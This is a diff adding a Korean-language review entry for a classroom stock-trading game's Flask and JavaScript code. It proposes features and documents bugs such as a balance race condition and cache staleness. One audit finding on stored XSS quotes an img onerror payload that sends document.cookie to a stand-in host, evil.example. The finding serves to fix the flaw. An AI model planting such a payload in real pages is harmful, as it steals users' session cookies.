@@ -1227,3 +1227,37 @@
 - **`_lot_round_due()` 동일 요청에서 이중 호출** (`app.py:300`, `app.py:409-430`, `app.py:470-473`): `GET /api/rooms/<rid>` 처리 시 `_auto_start_lottery_if_due(room)` (line 470) 과 `_get_room_cached()` → `room_dict()` → `_lot_round_due()` (line 300) 가 순서대로 각각 호출됨. `_lot_round_due()` 는 `_lots[rid]` 초기화·상태 조회·percentage 계산을 포함하므로 불필요한 중복 실행. `_auto_start_lottery_if_due()` 에서 계산 결과를 반환하고 `room_dict()` 가 이를 재사용하도록 리팩터링하거나, `_lot_round_due()` 를 경량화해 중복 호출 비용을 최소화할 것.
 
 - **`closeLotteryOverlay()` 가 paused-banner 를 실제 게임 상태와 무관하게 무조건 삭제** (`app.js:2277-2281`): 마지막 줄 `document.getElementById('paused-banner')?.remove()` 가 게임이 여전히 `paused` 상태인 경우에도 배너를 제거함. 복권 결과를 확인하고 닫은 뒤 진행자가 별도로 일시정지한 게임에서 참가자가 "거래 가능" 상태로 착각할 수 있음. `if (S.room?.status !== 'paused') document.getElementById('paused-banner')?.remove();` 로 조건부 삭제하거나, 오버레이 닫기 후 룸 상태를 재확인해 배너 표시 여부를 결정하도록 개선 필요.
+
+---
+
+## 2026-06-27 (2차)
+
+### 추가하면 좋을 기능
+
+- **진행자 게임 중 공지사항 브로드캐스트** (`app.py:new endpoint POST /api/rooms/<rid>/host/announce`, `app.js:new overlay`): 진행자가 "30분 후 세금 이벤트 예정!", "금 섹터 집중 주목!" 같은 자유 텍스트 공지를 게임 중 실시간으로 전송하면 모든 참가자 화면에 10초짜리 전체화면 팝업 배너로 표시하는 기능. 현재 폭탄뉴스(`showBombNews()`, `app.js:1148`)는 자동 생성 헤드라인만 표시하지만, 공지사항은 진행자가 직접 입력한 메시지를 전달. 서버 측에는 `_announcements = {rid: {text: str, ts: float}}` 인메모리 딕셔너리를 추가하고 `GET /api/rooms/<rid>/news` 응답에 `announcement` 필드를 포함시키는 방식으로 8초 폴링 인프라를 재활용하면 신규 엔드포인트 1개 + JS 20줄 미만으로 구현 가능.
+
+- **진행자 사전 이벤트 스케줄러** (`app.py:new endpoint POST /api/rooms/<rid>/host/schedule-event`, `models.py:Room`): 진행자가 게임 시작 전 "게임 40% 경과 시 반도체 섹터 -15%", "종료 10분 전 전체 시장 +8%" 등 이벤트를 미리 등록해 두면 `room_dict()` 내 `_lot_round_due()` 패턴과 동일하게 타이밍 도달 시 자동으로 `force_sector_event()`를 트리거하는 기능. 이벤트 목록을 `Room` 모델에 `scheduled_events TEXT` (JSON 직렬화) 컬럼으로 영속화하고 `get_room()` (`app.py:432`) 의 자동 종료 체크 블록 직후 스케줄 체크 루프를 추가하면 됨. 수업 시나리오를 미리 준비한 교사가 게임 중 화면에서 눈을 뗄 필요 없이 준비된 이벤트가 자동 실행되어 수업 몰입도를 높임.
+
+- **학생 현금 안전금고(자기 보호 하한)** (`app.js:execTrade()`, `app.js:doRouletteSpin()`): 학생이 "잔액의 최소 20%는 절대 쓰지 않겠다"는 하한을 설정하면 `execTrade()` 와 `doRouletteSpin()` 이 해당 금액 이하로의 거래를 클라이언트 측에서 차단하고 경고를 표시하는 기능. `localStorage.setItem('safetyFloor-' + S.room.id, amount)` 로 저장하고 포트폴리오 탭에 설정 UI를 추가하면 서버 변경 없이 순수 JS로 구현 가능. 충동적 투자 억제·손실 관리 교육과 연계 가능하며, "내 안전금고는 얼마였나요?" 수업 후 토론 소재로 활용될 수 있음.
+
+- **방 설정 자동 저장 (localStorage 자동 채움)** (`app.js:doCreateRoom()`, `index.html:51-65`): 진행자가 방을 만들 때 설정한 게임 시간·시작 자금·예금 금리를 `doCreateRoom()` 성공 시 `localStorage.setItem('lastRoomCfg', JSON.stringify({dur, cash, rate}))` 로 저장하고, 다음 방 만들기 화면(`screen-host-create`) 진입 시 `lastRoomCfg` 를 읽어 폼 필드를 자동 채우는 기능. 매 수업마다 동일한 값을 재입력하는 불편을 없애며 서버 변경 없이 10줄 미만으로 구현 가능. `doCreateRoom()` 반환 시와 방 만들기 화면 진입 이벤트(`enterHostLobby()` 진입 전 showScreen 호출부)에 각각 1~2줄 추가하면 완성됨.
+
+- **학생 개인 거래내역 CSV 다운로드** (`app.py:new endpoint GET /api/rooms/<rid>/transactions/export`): 현재 엑셀 내보내기(`app.py:1419`)는 호스트 전용이며 최종 순위만 포함됨. 참가자 본인의 전체 거래 내역(매수/매도/보상/룰렛)을 CSV 형식으로 다운로드하는 엔드포인트를 추가하면, 학생이 게임 종료 후 자신의 거래 전략을 직접 분석하는 수업 활동이 가능해짐. `RoomTransaction.query.filter_by(room_id=rid, user_id=user.id)` 결과를 파이썬 표준 라이브러리 `csv.DictWriter` 로 스트리밍하면 `openpyxl` 없이 경량 구현 가능 (`app.py:1417` 참조). 헤더는 `날짜, 종목, 유형, 수량, 가격, 금액, 메모` 로 한글화.
+
+- **진행자 시장 탭에서 종목 차트 바로 조회** (`app.js:314-358`, `app.js:1327-1357`): 진행자 시장 탭(`loadHostMarket()`) 의 종목 카드는 현재 가격·변동률만 표시하고 클릭해도 아무 반응이 없음. 강제 시세 변경 전 추세를 파악하려면 진행자가 별도로 학생 화면을 열어야 함. `renderGrid()` 와 달리 `loadHostMarket()` 의 카드 생성 템플릿(`app.js:343-358`)에 `onclick="openStockModal('${st.symbol}')"` 을 추가하면 기존 `openStockModal()` 함수(`app.js:1327`)를 재사용해 차트 모달을 바로 열 수 있음. 단, 진행자 화면에서는 매수/매도 버튼을 숨기거나 비활성화(`S.room.is_host` 체크)해야 하며, 이미 `host_members_transactions` 모달에 같은 패턴이 있어 5줄 이내 수정으로 구현 가능.
+
+---
+
+### 제거/단순화할 것들
+
+- **`trade()` 잔액 검사-커밋 간 TOCTOU — 동시 매수 시 음수 현금 가능** (`app.py:748-765`): `if member.cash < amount: return ...` 체크와 `db.session.commit()` 사이에 DB 수준 잠금이 없어, 동일 학생이 두 탭에서 거의 동시에 매수 요청을 보내면 두 요청 모두 "잔액 충분" 판정을 통과한 뒤 각각 커밋돼 현금이 음수가 될 수 있음. 예: 잔액 600만 원에서 400만 원짜리 주식 두 건 동시 매수 → 최종 현금 -200만 원. 근본 해결책: `member.cash = RoomMember.cash - amount` 대신 SQLAlchemy `UPDATE room_members SET cash = cash - :amount WHERE id = :id AND cash >= :amount` 원자적 감소 + `rowcount == 0` 시 잔액 부족 에러 반환. 단기 해결책: 트랜잭션 내 `db.session.refresh(member)` + 재검증 후 커밋 패턴으로 스테일 읽기 방지 (`app.py:748` 직전).
+
+- **`host_market_event()` 뉴스 캐시 미무효화** (`app.py:1357-1360`): `force_sector_event()` 내부에서 `self._news` 와 `self._last_news_ts` 를 갱신하지만, `_news_cache` (`app.py:67`) 딕셔너리는 무효화되지 않아 섹터 이벤트 직후 최대 2초 동안 참가자가 이전 뉴스를 받음. `host_force_price()` 의 동일 문제는 2026-06-23 (2차) 항목에 기록됐으나 `host_market_event()` 는 포함되지 않았음. `return jsonify(...)` 직전(`app.py:1360`)에 `_invalidate_news_cache(rid)` 한 줄 추가로 해결되며, 섹터 이벤트와 연계 뉴스가 즉시 클라이언트에 반영됨.
+
+- **`loadStudentTxn()` `t.note` HTML 미이스케이프 — 진행자 입력 Stored XSS** (`app.js:530-531`, `app.py:596`): `host_adjust()` 의 `note = d.get('note', '진행자 자산 조정')` 는 사용자 입력을 그대로 DB(`RoomTransaction.note`)에 저장하고, `host_member_transactions()` 와 `get_transactions()` 가 이를 반환하면 `loadStudentTxn()` 의 `` `${t.note ? ' · ' + t.note : ''}` `` 이 `innerHTML` 에 이스케이프 없이 삽입됨. 진행자가 조정 메모 입력란(`adj-note`)에 `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` 를 입력하면 거래 내역 모달을 여는 진행자 본인 화면에서 Stored XSS 발생. `app.js:531` 에서 `escHtml(t.note)` 적용 필수 (`escHtml()` 함수는 `app.js:897-899` 에 이미 존재); 서버 측에서도 `app.py:596` 에서 `note = note[:100]` 길이 제한 추가 권장.
+
+- **`get_quiz()` 조회 시 `seen` 에 즉시 추가 — 제출 없이도 문제 소모** (`app.py:1265-1268`): `GET /api/rooms/<rid>/quiz` 응답 시점에 `seen.add(q['id'])` 가 실행됨(`app.py:1266`). 학생이 퀴즈 오버레이를 열었다가 답하지 않고 닫으면 해당 문제는 "조회됨"으로 처리돼 재출제되지 않음. 15개 문제가 있다면 학생이 15번 연속 열고 닫으면 모든 문제를 소모해 이후 출제될 문제가 없어짐. 수정 방법: `seen.add(q['id'])` 를 `submit_quiz()` (`app.py:1341`) 내 정답/오답 처리 블록으로 이동하거나, `GET` 응답에 `pending_qid` 만 저장하고 `POST` 제출 시 확정하는 두 단계 처리로 변경 (`app.py:1267`).
+
+- **`force_sector_event()` 후 `_current_biases` 미갱신 — 섹터 이벤트가 다음 TTL에 역전** (`stock_service.py:244-276`): `force_price()` 의 동일 문제는 2026-06-11 항목에 문서화됐으나 `force_sector_event()` 는 포함되지 않음. 이 함수는 섹터 내 모든 종목 가격을 강제 이동시키지만 `self._current_biases` 를 갱신하지 않아, 다음 `_price_ttl` 사이클(기본 20초)에서 기존 bias 방향으로 가격이 역전될 수 있음. `for sym in affected:` 루프 내 (`stock_service.py:252` 직후)에 `self._current_biases[sym] = 'up' if pct > 0 else 'down'` 한 줄 추가로 섹터 이벤트 모멘텀이 다음 사이클에도 유지됨.
+
+- **`_next_price()` 자연 변동 상한 `base * 1.4` vs. `force_price()` 상한 `base * 3.0` 불일치** (`stock_service.py:139`, `stock_service.py:225`): 자연 가격 변동은 `max(base * 0.6, min(base * 1.4, new_price))` 로 제한되지만, 진행자 강제 조정은 `max(base * 0.3, min(base * 3.0, new_price))` 까지 허용함. 강제로 `base * 2.0` 으로 올린 뒤 다음 TTL에 자연 변동이 발생하면 `_next_price()` 가 `current`(=`base*2.0`)를 기준으로 새 가격을 계산하는 게 아니라 내부적으로 여전히 `base * 1.4` 캡을 적용하므로 강제 조정 효과가 1 TTL(20초) 만에 사라짐. 해결책: `_next_price()` 캡을 현재가 기준 상대 범위(`current * [0.7, 1.3]`)로 변경하거나, `force_price()` 직후 `_price_ttl` 동안 해당 종목의 자연 변동을 스킵하는 `_force_protected: set` 플래그를 추가해야 함 (`stock_service.py:174` 의 `get_price()` 캐시 체크 로직 참조).
